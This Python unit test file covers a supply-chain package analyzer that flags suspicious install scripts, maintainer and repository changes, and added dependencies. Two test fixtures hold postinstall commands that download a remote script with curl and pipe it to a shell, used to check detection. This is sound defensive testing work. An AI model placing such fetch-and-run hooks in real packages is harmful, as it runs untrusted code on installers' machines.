"""Tests for the analyzer and detection rules."""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from supply_chain_watch.analyzer import (
    analyze_snapshots,
    compare_snapshots,
    load_snapshot_file,
    scan_snapshot,
)
from supply_chain_watch.models import PackageSnapshot, Severity


def snap(data: dict) -> PackageSnapshot:
    return PackageSnapshot.from_dict(data)


class LoadSnapshotFileTests(unittest.TestCase):
    def test_load_single_object(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "pkg.json"
            path.write_text(json.dumps({"name": "pkg", "version": "1.0.0"}), encoding="utf-8")
            snaps = load_snapshot_file(path)
            self.assertEqual(len(snaps), 1)
            self.assertEqual(snaps[0].name, "pkg")

    def test_load_packages_wrapper(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "pkgs.json"
            path.write_text(
                json.dumps({"packages": [{"name": "a"}, {"name": "b"}]}),
                encoding="utf-8",
            )
            snaps = load_snapshot_file(path)
            self.assertEqual([s.name for s in snaps], ["a", "b"])

    def test_load_invalid_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "bad.json"
            path.write_text("{not json", encoding="utf-8")
            with self.assertRaises(ValueError):
                load_snapshot_file(path)


class ScanSnapshotTests(unittest.TestCase):
    def test_detects_suspicious_lifecycle_script(self) -> None:
        report = scan_snapshot(
            [
                snap(
                    {
                        "name": "evil-pkg",
                        "version": "1.0.0",
                        "scripts": {"postinstall": "curl https://example.com/x.sh | bash"},
                    }
                )
            ]
        )
        rule_ids = {f.rule_id for f in report.findings}
        self.assertIn("SUSPICIOUS_SCRIPT", rule_ids)
        critical = [f for f in report.findings if f.rule_id == "SUSPICIOUS_SCRIPT"]
        self.assertTrue(any(f.severity == Severity.CRITICAL for f in critical))

    def test_detects_missing_metadata(self) -> None:
        report = scan_snapshot([snap({"name": "bare-pkg", "version": "0.0.1"})])
        missing = [f for f in report.findings if f.rule_id == "MISSING_METADATA"]
        self.assertEqual(len(missing), 1)
        self.assertIn("repository", missing[0].details["missing_fields"])


class CompareSnapshotsTests(unittest.TestCase):
    def test_maintainer_change(self) -> None:
        base = snap({"name": "pkg", "maintainers": [{"email": "a@example.com"}]})
        curr = snap({"name": "pkg", "maintainers": [{"email": "b@example.com"}]})
        findings = compare_snapshots(base, curr)
        self.assertTrue(any(f.rule_id == "MAINTAINER_CHANGE" for f in findings))

    def test_dependency_added_and_changed(self) -> None:
        base = snap({"name": "pkg", "dependencies": {"left-pad": "1.0.0"}})
        curr = snap(
            {"name": "pkg", "dependencies": {"left-pad": "2.0.0", "evil": "0.1.0"}}
        )
        findings = compare_snapshots(base, curr)
        ids = {f.rule_id for f in findings}
        self.assertIn("DEPENDENCY_ADDED", ids)
        self.assertIn("DEPENDENCY_CHANGED", ids)

    def test_repository_change(self) -> None:
        base = snap({"name": "pkg", "repository": "https://github.com/a/pkg"})
        curr = snap({"name": "pkg", "repository": "https://github.com/b/pkg"})
        findings = compare_snapshots(base, curr)
        repo = [f for f in findings if f.rule_id == "REPOSITORY_CHANGED"]
        self.assertEqual(len(repo), 1)
        self.assertEqual(repo[0].severity, Severity.HIGH)

    def test_script_added_lifecycle(self) -> None:
        base = snap({"name": "pkg", "scripts": {}})
        curr = snap({"name": "pkg", "scripts": {"preinstall": "node ./setup.js"}})
        findings = compare_snapshots(base, curr)
        added = [f for f in findings if f.rule_id == "SCRIPT_ADDED"]
        self.assertEqual(len(added), 1)
        self.assertEqual(added[0].severity, Severity.HIGH)

    def test_name_mismatch_raises(self) -> None:
        with self.assertRaises(ValueError):
            compare_snapshots(snap({"name": "a"}), snap({"name": "b"}))


class AnalyzeSnapshotsTests(unittest.TestCase):
    def test_reports_new_and_removed_packages(self) -> None:
        base = [snap({"name": "old", "version": "1.0.0"}), snap({"name": "shared"})]
        curr = [snap({"name": "new", "version": "1.0.0"}), snap({"name": "shared"})]
        report = analyze_snapshots(curr, base)
        ids = {(f.rule_id, f.package) for f in report.findings}
        self.assertIn(("NEW_PACKAGE", "new"), ids)
        self.assertIn(("PACKAGE_REMOVED", "old"), ids)

    def test_analyze_without_baseline(self) -> None:
        report = analyze_snapshots(
            [snap({"name": "pkg", "scripts": {"postinstall": "curl http://x | sh"}})]
        )
        self.assertTrue(report.findings)
        self.assertIsNone(report.baseline_source)


if __name__ == "__main__":
    unittest.main()
